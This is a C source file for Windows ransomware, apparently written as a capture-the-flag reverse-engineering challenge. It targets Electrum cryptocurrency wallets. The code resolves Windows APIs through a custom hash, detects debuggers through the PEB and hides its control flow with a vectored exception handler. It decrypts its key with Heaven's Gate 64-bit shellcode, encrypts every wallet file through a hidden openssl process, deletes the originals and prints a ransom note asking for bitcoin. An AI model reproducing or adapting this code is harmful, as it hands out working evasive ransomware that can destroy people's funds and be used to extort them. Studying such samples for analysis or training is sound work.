#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>

#pragma GCC diagnostic ignored "-Wformat"

// precalculated API hashes
#define HASH_VIRTUALALLOC                     0x2936516cUL
#define HASH_VIRTUALPROTECT                   0x5eeef9baUL
#define HASH_EXITPROCESS                      0xa4e95741UL
#define HASH_CREATEFILEA                      0x9b23778dUL
#define HASH_READFILE                         0x3b17b068UL
#define HASH_GETFILESIZE                      0xc089aa6dUL
#define HASH_GETENVIRONMENTVARIABLEA          0xa757facbUL
#define HASH_FINDFIRSTFILEA                   0x1dda3a23UL
#define HASH_FINDNEXTFILEA                    0xacab0164UL
#define HASH_WAITFORSINGLEOBJECT              0x7b47521cUL
#define HASH_CLOSEHANDLE                      0x25bbf34eUL
#define HASH_DELETEFILEA                      0x926f1f63UL
#define HASH_CREATEPROCESSA                   0x3d832d75UL
#define HASH_FINDCLOSE                        0xdbc2b3b2UL
#define HASH_CRYPTACQUIRECONTEXTA             0x307116d9UL
#define HASH_CRYPTCREATEHASH                  0x4acb8120UL
#define HASH_CRYPTHASHDATA                    0x1fe9c81fUL
#define HASH_CRYPTGETHASHPARAM                0x747901edUL
#define HASH_CRYPTDESTROYHASH                 0xb44cddd3UL
#define HASH_CRYPTRELEASECONTEXT              0x4c86c827UL
#define HASH_ISWOW64PROCESS                   0xa88138fbUL
#define HASH_GETCURRENTPROCESS                0x49be8de3UL
#define HASH_ADDVECTOREDEXCEPTIONHANDLER      0xaf3986deUL
#define HASH_REMOVEVECTOREDEXCEPTIONHANDLER   0xa1819137UL

// Heaven's Gate constants
#define BOOTSTRAP_SZ 0xF
#define UNBOOTSTRAP_SZ 0x10
#define ENCKEY_SZ 32
#define XOR_DECRYPT_SZ 0x5A

/* In 32 bit mode:
    push 3
    pop eax
    shl eax, 4
    add al, 3
    push eax
    push <patched address>
    retf
*/
#define BOOTSTRAP \
  0x6a, 0x03, 0x58, 0xc1, 0xe0, 0x04, 0x04, 0x03, 0x50, 0x68, 0x00, 0x00, \
  0x00, 0x00, 0xcb

/* In 64 bit mode:
    push 2
    pop rax
    shl eax, 4
    add al, 3
    push rax
    push <patched address>
    retfq
*/
#define UNBOOTSTRAP \
  0x6a, 0x02, 0x58, 0xc1, 0xe0, 0x04, 0x04, 0x03, 0x50, 0x68, 0x00, 0x00, \
  0x00, 0x00, 0x48, 0xCB

// encrypted AES key (flag)
#define ENCKEY \
  0x0B, 0x05, 0x11, 0x06, 0x0F, 0x31, 0x27, 0x34, 0x7E, 0x36, \
  0x5C, 0x2D, 0x31, 0x5B, 0x20, 0x1A, 0x46, 0x2B, 0x26, 0x5E, \
  0x62, 0x3A, 0x5A, 0x12, 0x3B, 0x2D, 0x5F, 0x02, 0x57, 0x00, \
  0x41, 0x08

// shellcode which runs in 64 bit mode. placeholder addresses gets patched at runtime. 
// repeating key xor cipher
#define XOR_DECRYPT \
  0x53, 0x56, 0x57, 0x49, 0xb8, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, \
  0xaa, 0xaa, 0xaa, 0x48, 0xc7, 0xc1, 0x19, 0x00, 0x00, 0x00, \
  0x49, 0xb9, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, \
  0x48, 0xc7, 0xc7, 0x20, 0x00, 0x00, 0x00, 0x49, 0xba, 0xcc, \
  0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x31, 0xdb, \
  0x48, 0x39, 0xfb, 0x73, 0x20, 0x41, 0x8a, 0x04, 0x19, 0x48, \
  0x89, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0xf7, 0xf1, 0x41, 0x8a, \
  0x14, 0x10, 0x41, 0x8a, 0x04, 0x19, 0x30, 0xd0, 0x41, 0x88, \
  0x04, 0x1a, 0x48, 0xff, 0xc3, 0xeb, 0xdb, 0x5f, 0x5e, 0x5b

// PEB/TEB STRUCTURES
#ifndef _UNICODE_STRING_DEFINED
#define _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#endif

// custom salsa20 implementation
// Custom rotation values (different from standard 7, 9, 13, 18)
#define ROTL32(a, b) (((a) << (b)) | ((a) >> (32 - (b))))
#define SQR(a, b, c, d) ( \
    b ^= ROTL32(a + d,  5), \
    c ^= ROTL32(b + a, 11), \
    d ^= ROTL32(c + b, 17), \
    a ^= ROTL32(d + c, 23))

// Using "SRPH", "LNCE", "NITE", "2025" as nothing-up-my-sleeve numbers
#define CONST0 0x48505253
#define CONST1 0x45434E4C  
#define CONST2 0x4554494E 
#define CONST3 0x35323032 

// Salsa20-variant hash: 4 double-rounds, custom rotations
DWORD calculateCustomHash(const char* str) {
    uint32_t state[16];
    uint32_t x[16];
    size_t len = 0;
    
    // Calculate string length
    while (str[len]) len++;
    
    // Initialize state matrix with custom layout:
    // CONST0  | str[0-3]  | str[4-7]  | str[8-11]
    // str[12-15] | CONST1 | nonce0    | nonce1
    // pos0    | pos1      | CONST2    | str[16-19]
    // str[20-23] | str[24-27] | str[28-31] | CONST3
    
    // Fill state with string data (pad with length)
    for (int i = 0; i < 16; i++) {
        state[i] = (uint32_t)len;
    }
    
    // Inject string bytes into state
    for (size_t i = 0; i < len && i < 48; i++) {
        size_t word_idx = (i / 4);
        size_t byte_idx = i % 4;
        if (word_idx < 16) {
            state[word_idx] ^= ((uint32_t)(unsigned char)str[i]) << (byte_idx * 8);
        }
    }
    
    // Set custom constants at diagonal positions
    state[0]  ^= CONST0;
    state[5]  ^= CONST1;
    state[10] ^= CONST2;
    state[15] ^= CONST3;
    
    // Copy state to working array
    for (int i = 0; i < 16; i++) {
        x[i] = state[i];
    }
    
    // 4 double-rounds
    for (int i = 0; i < 4; i++) {
        // Odd round - columns
        SQR(x[ 0], x[ 4], x[ 8], x[12]);
        SQR(x[ 5], x[ 9], x[13], x[ 1]);
        SQR(x[10], x[14], x[ 2], x[ 6]);
        SQR(x[15], x[ 3], x[ 7], x[11]);
        // Even round - rows
        SQR(x[ 0], x[ 1], x[ 2], x[ 3]);
        SQR(x[ 5], x[ 6], x[ 7], x[ 4]);
        SQR(x[10], x[11], x[ 8], x[ 9]);
        SQR(x[15], x[12], x[13], x[14]);
    }
    
    // Add original state back (Salsa20 feedforward)
    for (int i = 0; i < 16; i++) {
        x[i] += state[i];
    }
    
    // Collapse 512 bits to 32 bits via XOR
    uint32_t hash = 0;
    for (int i = 0; i < 16; i++) {
        hash ^= x[i];
    }
    
    return hash;
}

// API resolver by hash
FARPROC getApiByHash(const char* library, DWORD hash) {
    HMODULE hMod = LoadLibraryA(library);
    if (!hMod) return NULL;
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + exportRVA);
    
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD* ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hMod + names[i]);
        if (calculateCustomHash(name) == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Typedefs for API function pointers
typedef LPVOID (WINAPI* pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI* pCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI* pReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI* pGetFileSize_t)(HANDLE, LPDWORD);
typedef HANDLE (WINAPI* pFindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI* pFindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA);
typedef DWORD (WINAPI* pWaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI* pCloseHandle_t)(HANDLE);
typedef BOOL (WINAPI* pDeleteFileA_t)(LPCSTR);
typedef BOOL (WINAPI* pCreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI* pFindClose_t)(HANDLE);
typedef BOOL (WINAPI* pCryptAcquireContextA_t)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
typedef BOOL (WINAPI* pCryptCreateHash_t)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
typedef BOOL (WINAPI* pCryptHashData_t)(HCRYPTHASH, BYTE*, DWORD, DWORD);
typedef BOOL (WINAPI* pCryptGetHashParam_t)(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
typedef BOOL (WINAPI* pCryptDestroyHash_t)(HCRYPTHASH);
typedef BOOL (WINAPI* pCryptReleaseContext_t)(HCRYPTPROV, DWORD);
typedef BOOL (WINAPI* pIsWow64Process_t)(HANDLE, PBOOL);
typedef HANDLE (WINAPI* pGetCurrentProcess_t)(VOID);
typedef PVOID (WINAPI* pAddVectoredExceptionHandler_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef ULONG (WINAPI* pRemoveVectoredExceptionHandler_t)(PVOID);
typedef VOID (WINAPI* pExitProcess_t)(UINT);

// Global VEH handler handle and state
static PVOID g_veh_handle = NULL;
static volatile int g_in_exception_handler = 0;

#define WOW64_PEB_PROCESS_PARAMS          0x010
#define WOW64_RTL_USER_PROC_ENVIRONMENT   0x048

// VEH EXCEPTION HANDLER

// Forward declaration of stage 2 payload
void veh_stage2(void);

// Global variables for hidden control flow triggers
static void* g_stage2_trigger = NULL;
static void* g_jit_trigger = NULL;
static uint32_t g_jit_entry = 0;

// VEH exception handler callback for 32-bit
LONG WINAPI veh_exception_handler(struct _EXCEPTION_POINTERS* ExceptionInfo) {
    // Prevent recursive exception handling
    if (g_in_exception_handler) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    g_in_exception_handler = 1;

    
    DWORD exception_code = ExceptionInfo->ExceptionRecord->ExceptionCode;
    
    // Handle access violations during memory probing
    if (exception_code == EXCEPTION_ACCESS_VIOLATION) {
        
        // Check if this is our deliberate fault for hidden control flow
        // ExceptionAddress is where the fault occurred
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == g_stage2_trigger) {
             // Redirect execution to our hidden stage 2 payload
             ExceptionInfo->ContextRecord->Eip = (DWORD)veh_stage2;
             g_in_exception_handler = 0;
             return EXCEPTION_CONTINUE_EXECUTION;
        }

        // Check for JIT redirection (if used inside stage 2)
        if (g_jit_entry != 0 && ExceptionInfo->ExceptionRecord->ExceptionAddress == g_jit_trigger) {
             ExceptionInfo->ContextRecord->Eip = g_jit_entry;
             g_in_exception_handler = 0;
             return EXCEPTION_CONTINUE_EXECUTION;
        }

        // Skip the faulting instruction by incrementing EIP
        // For 32-bit: Eip register
        ExceptionInfo->ContextRecord->Eip += 1;
        g_in_exception_handler = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    // Handle single-step exceptions (anti-debugging)
    if (exception_code == EXCEPTION_SINGLE_STEP) {
        // Check debug registers for hardware breakpoints
        CONTEXT* ctx = ExceptionInfo->ContextRecord;
        if (ctx->Dr0 != 0 || ctx->Dr1 != 0 || ctx->Dr2 != 0 || ctx->Dr3 != 0) {
            // Hardware breakpoint detected - terminate
            g_in_exception_handler = 0;
            pExitProcess_t pExitProcess = (pExitProcess_t)getApiByHash("kernel32.dll", HASH_EXITPROCESS);
            if (pExitProcess) pExitProcess(1);
        }
        g_in_exception_handler = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    g_in_exception_handler = 0;
    return EXCEPTION_CONTINUE_SEARCH;
}

// PEB ACCESS FUNCTIONS

__attribute__((always_inline)) inline void* get_peb() {
    void* peb;
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(peb));
    return peb;
}

// Get USERPROFILE via PEB.ProcessParameters
int get_userprofile_peb(char* path_out, size_t max_len) {
    void* peb = get_peb();
    void* params = *(void**)((unsigned char*)peb + WOW64_PEB_PROCESS_PARAMS);
    
    if (!params) return 0;
    
    void* environment = *(void**)((unsigned char*)params + WOW64_RTL_USER_PROC_ENVIRONMENT);
    if (!environment) return 0;
    
    WCHAR* env = (WCHAR*)environment;
    while (*env) {
        if (wcsncmp(env, L"USERPROFILE=", 12) == 0) {
            WCHAR* value = env + 12;
            size_t i = 0;
            while (value[i] && i < max_len - 1) {
                path_out[i] = (char)value[i];
                i++;
            }
            path_out[i] = '\0';
            return 1;
        }
        
        while (*env) env++;
        env++;
    }
    
    return 0;
}


// PEB-based debugger detection for 32-bit (DEBUG ENABLED)
int check_debugger_peb() {
    void* peb = get_peb();
    if (!peb) return 0;
    
    // Check PEB.BeingDebugged flag at offset 0x02 (32-bit)
    unsigned char being_debugged = *((unsigned char*)peb + 0x02);
    if (being_debugged) return 1;
    
    // Check PEB.NtGlobalFlag at offset 0x68 (32-bit)
    DWORD nt_global_flag = *(DWORD*)((unsigned char*)peb + 0x68);
    if (nt_global_flag & 0x70) return 1;
    
    return 0;
}

// INITIALIZATION - Only sets up VEH and triggers (no API caching)
void initVEH() {
    pVirtualAlloc_t pVirtualAlloc = (pVirtualAlloc_t)getApiByHash("kernel32.dll", HASH_VIRTUALALLOC);
    
    // Allocate reserved but uncommitted memory for triggers (PAGE_NOACCESS)
    // This creates addresses that are guaranteed to cause Access Violation
    if (pVirtualAlloc) {
        g_stage2_trigger = pVirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_NOACCESS);
        g_jit_trigger = pVirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_NOACCESS);
    }

    // Register VEH handler for exception handling
    g_veh_handle = AddVectoredExceptionHandler(1, veh_exception_handler);
}

// Check WOW64 compatibility
int check_wow64_compatibility() {
    pIsWow64Process_t pIsWow64Process = (pIsWow64Process_t)getApiByHash("kernel32.dll", HASH_ISWOW64PROCESS);
    pGetCurrentProcess_t pGetCurrentProcess = (pGetCurrentProcess_t)getApiByHash("kernel32.dll", HASH_GETCURRENTPROCESS);
    
    if (!pIsWow64Process || !pGetCurrentProcess) return 0;
    
    BOOL isWow64 = FALSE;
    if (!pIsWow64Process(pGetCurrentProcess(), &isWow64)) return 0;
    
    // Return 1 ONLY if running under WOW64, otherwise 0
    return isWow64 ? 1 : 0;
}

int decrypt_aes_key(const char* xor_key, uint32_t key_len, unsigned char* output) {
    static uint8_t recipe[] = {BOOTSTRAP, ENCKEY, XOR_DECRYPT, UNBOOTSTRAP, 0xC3};
    static uint32_t ptr = 0;
    static DWORD oldProtect = 0;
    
    if (!ptr) {
        pVirtualProtect_t pVirtualProtect = (pVirtualProtect_t)getApiByHash("kernel32.dll", HASH_VIRTUALPROTECT);
        if (!pVirtualProtect) return -1;
        
        if (!pVirtualProtect(recipe, sizeof(recipe), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return -1;
        }
        ptr = (uint32_t)(uintptr_t)recipe;
    }
    
    uint32_t xor_start = ptr + BOOTSTRAP_SZ + ENCKEY_SZ;
    uint32_t unboot_start = xor_start + XOR_DECRYPT_SZ;
    uint32_t ret_addr = unboot_start + UNBOOTSTRAP_SZ;
    
    *(uint32_t*)(ptr + 10) = xor_start;
    *(uint64_t*)(xor_start + 0x05) = (uint64_t)(uintptr_t)xor_key;
    *(uint32_t*)(xor_start + 0x10) = key_len;
    *(uint64_t*)(xor_start + 0x16) = (uint64_t)(uintptr_t)(ptr + BOOTSTRAP_SZ);
    *(uint32_t*)(xor_start + 0x21) = ENCKEY_SZ;
    *(uint64_t*)(xor_start + 0x27) = (uint64_t)(uintptr_t)output;
    *(uint32_t*)(unboot_start + 10) = ret_addr;
    
    // Store JIT entry point for VEH redirection
    g_jit_entry = ptr;
    
    void (*trigger_fault)() = (void (*)())g_jit_trigger;
    trigger_fault();
    
    return 0;
}

int get_xor_key_from_server(char* xor_key_out) {
    char profilePath[260], recentServersPath[512];
    
    // Use PEB to get USERPROFILE instead of GetEnvironmentVariable
    if (!get_userprofile_peb(profilePath, 260)) {
        return 0;
    }
    
    sprintf(recentServersPath, "%s\\AppData\\Roaming\\Electrum\\recent_servers", profilePath);
    
    pCreateFileA_t pCreateFileA = (pCreateFileA_t)getApiByHash("kernel32.dll", HASH_CREATEFILEA);
    pGetFileSize_t pGetFileSize = (pGetFileSize_t)getApiByHash("kernel32.dll", HASH_GETFILESIZE);
    pReadFile_t pReadFile = (pReadFile_t)getApiByHash("kernel32.dll", HASH_READFILE);
    pCloseHandle_t pCloseHandle = (pCloseHandle_t)getApiByHash("kernel32.dll", HASH_CLOSEHANDLE);
    
    if (!pCreateFileA || !pGetFileSize || !pReadFile || !pCloseHandle) return 0;
    
    HANDLE hFile = pCreateFileA(recentServersPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD fileSize = pGetFileSize(hFile, NULL);
     if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        pCloseHandle(hFile);
        return 0;
    }
    
    char* fileData = (char*)malloc(fileSize + 1);
    if (!fileData) {
        pCloseHandle(hFile);
        return 0;
    }
    
    DWORD bytesRead = 0;
    
    pReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    fileData[fileSize] = '\0';
    pCloseHandle(hFile);
    
    // Get crypto APIs
    pCryptAcquireContextA_t pCryptAcquireContextA = (pCryptAcquireContextA_t)getApiByHash("advapi32.dll", HASH_CRYPTACQUIRECONTEXTA);
    pCryptCreateHash_t pCryptCreateHash = (pCryptCreateHash_t)getApiByHash("advapi32.dll", HASH_CRYPTCREATEHASH);
    pCryptHashData_t pCryptHashData = (pCryptHashData_t)getApiByHash("advapi32.dll", HASH_CRYPTHASHDATA);
    pCryptGetHashParam_t pCryptGetHashParam = (pCryptGetHashParam_t)getApiByHash("advapi32.dll", HASH_CRYPTGETHASHPARAM);
    pCryptDestroyHash_t pCryptDestroyHash = (pCryptDestroyHash_t)getApiByHash("advapi32.dll", HASH_CRYPTDESTROYHASH);
    pCryptReleaseContext_t pCryptReleaseContext = (pCryptReleaseContext_t)getApiByHash("advapi32.dll", HASH_CRYPTRELEASECONTEXT);
    
    if (!pCryptAcquireContextA || !pCryptCreateHash || !pCryptHashData || 
        !pCryptGetHashParam || !pCryptDestroyHash || !pCryptReleaseContext) {
        free(fileData);
        return 0;
    }
    
    int stringsFound = 0;
    for (size_t pos = 0; pos < fileSize; pos++) {
        if (fileData[pos] == '"') {
            size_t endPos = pos + 1;
            while (endPos < fileSize && fileData[endPos] != '"') endPos++;
            
            if (endPos < fileSize && endPos > pos + 1) {
                stringsFound++;
                int len = (int)(endPos - pos - 1);
                if (len > 255) len = 255;  
                
                char extracted[256];
                memcpy(extracted, fileData + pos + 1, len);
                extracted[len] = '\0';
                
                HCRYPTPROV hProv = 0;
                HCRYPTHASH hHash = 0;
                
                if (!pCryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                    pos = endPos;
                    continue;
                }
                
                if (!pCryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
                    pCryptReleaseContext(hProv, 0);
                    pos = endPos;
                    continue;
                }
                
                pCryptHashData(hHash, (BYTE*)extracted, len, 0);
                
                BYTE hash[16];
                DWORD hashLen = 16;
                pCryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
                pCryptDestroyHash(hHash);
                pCryptReleaseContext(hProv, 0);
                
                char md5Hex[33];
                for (int i = 0; i < 16; i++) {
                    sprintf(md5Hex + i*2, "%02x", hash[i]);
                }
                md5Hex[32] = '\0';
                
                if (strcmp(md5Hex, "5fc44255053d10f73c65104fa689843f") == 0) {
                    strcpy(xor_key_out, extracted);
                    free(fileData);
                    return 1;
                }
                
                pos = endPos;
            }
        }
    }
    
    free(fileData);
    return 0;
}

int encrypt_wallets(const char* aes_key_hex) {
    char profilePath[260], walletsPath[512];
    
    if (!get_userprofile_peb(profilePath, 260)) {
        return 0;
    }
    
    sprintf(walletsPath, "%s\\AppData\\Roaming\\Electrum\\wallets", profilePath);
    
    char searchPath[512];
    sprintf(searchPath, "%s\\*", walletsPath);
    WIN32_FIND_DATAA findData;
    
    pFindFirstFileA_t pFindFirstFileA = (pFindFirstFileA_t)getApiByHash("kernel32.dll", HASH_FINDFIRSTFILEA);
    pFindNextFileA_t pFindNextFileA = (pFindNextFileA_t)getApiByHash("kernel32.dll", HASH_FINDNEXTFILEA);
    pFindClose_t pFindClose = (pFindClose_t)getApiByHash("kernel32.dll", HASH_FINDCLOSE);
    pCreateProcessA_t pCreateProcessA = (pCreateProcessA_t)getApiByHash("kernel32.dll", HASH_CREATEPROCESSA);
    pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)getApiByHash("kernel32.dll", HASH_WAITFORSINGLEOBJECT);
    pCloseHandle_t pCloseHandle = (pCloseHandle_t)getApiByHash("kernel32.dll", HASH_CLOSEHANDLE);
    pDeleteFileA_t pDeleteFileA = (pDeleteFileA_t)getApiByHash("kernel32.dll", HASH_DELETEFILEA);
    
    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose || 
        !pCreateProcessA || !pWaitForSingleObject || !pCloseHandle || !pDeleteFileA) {
        return 0;
    }
    
    HANDLE hFind = pFindFirstFileA(searchPath, &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    
    int count = 0;
    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char fullPath[512], command[2048];
            sprintf(fullPath, "%s\\%s", walletsPath, findData.cFileName);
            sprintf(command, "openssl enc -aes-256-cbc -in \"%s\" -out \"%s.seraph\" -K %s -iv 534552415048535F4C414E43455F3031 -nosalt",
                    fullPath, fullPath, aes_key_hex);
            
            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            
            if (pCreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                pWaitForSingleObject(pi.hProcess, INFINITE);
                pCloseHandle(pi.hProcess);
                pCloseHandle(pi.hThread);
                pDeleteFileA(fullPath);
                count++;
            } else {
            }
        }
    } while (pFindNextFileA(hFind, &findData));
    
    pFindClose(hFind);
    return count;
}


// stage 2. main logic. implemented only if access violation triggered
void veh_stage2(void) {
    char xor_key[256];
    if (!get_xor_key_from_server(xor_key)) {
        pExitProcess_t pExitProcess = (pExitProcess_t)getApiByHash("kernel32.dll", HASH_EXITPROCESS);
        if (pExitProcess) pExitProcess(1);
        return;
    }
    
    unsigned char decrypted_key[32] = {0};
    if (decrypt_aes_key(xor_key, (uint32_t)strlen(xor_key), decrypted_key) != 0) {
        pExitProcess_t pExitProcess = (pExitProcess_t)getApiByHash("kernel32.dll", HASH_EXITPROCESS);
        if (pExitProcess) pExitProcess(1);
        return;
    }
    
    char keyHex[65];
    for (int i = 0; i < 32; i++) {
        sprintf(keyHex + i*2, "%02x", decrypted_key[i]);
    }
    keyHex[64] = '\0';
    
    int count = encrypt_wallets(keyHex);
    
    pExitProcess_t pExitProcess = (pExitProcess_t)getApiByHash("kernel32.dll", HASH_EXITPROCESS);
    if (pExitProcess) {
        if (count > 0) {
           pExitProcess(0);
        }
        pExitProcess(1);
    }
}

int main() {
    initVEH();
    
    // Check for debugger using PEB
    if (check_debugger_peb()) {
        return 1;  // Exit silently if debugger detected
    }
    
    if (!check_wow64_compatibility()) {
        return 1;
    }

    printf("\nYour wallets will now be encrypted.\n\n");
    printf("To decrypt your wallets:\nsend BTC to: 1SERAPHSLANCEQ7S2K5M8R3T6Y4ZB1N3X7 and contact: seraphslance@1ndr4th.nite\n");
  
    
    // TRIGGER HIDDEN CONTROL FLOW
    // Instead of calling logic directly, we trigger an Access Violation at our reserved page
    // The VEH handler will catch this and pivot EIP to veh_stage2
    void (*trigger_stage2)() = (void (*)())g_stage2_trigger;
    trigger_stage2();
    
  return 0;
}
